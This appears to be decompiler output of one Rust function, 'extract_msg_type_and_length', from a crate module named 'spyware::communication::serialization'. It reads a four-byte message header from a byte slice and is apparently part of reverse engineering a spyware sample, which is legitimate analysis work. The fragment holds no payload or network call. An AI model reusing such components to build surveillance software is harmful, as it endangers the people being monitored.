undefined4
_ZN7spyware13communication13serialization27extract_msg_type_and_length17h40fb0f3bb65520f5E
          (undefined4 param_1)

{
  undefined4 uVar1;
  undefined4 local_34;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined local_18 [16];
  
  local_34 = param_1;
  local_30 = _ZN106__LT_core__ops__range__Range_LT_usize_GT__u20_as_u20_core__slice__index__SliceIndex_LT__u5b_T_u5d__GT__GT_5index17hd33b46b7e6d41613E
                       (&local_34);
  local_28 = 4;
  local_20 = 0;
  _ZN9byteorder2io12ReadBytesExt8read_u3217hc862b0b3b54702e5E(local_18,&local_30);
  uVar1 = _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17hd22533b134cbc616E(local_18);
  return uVar1;
}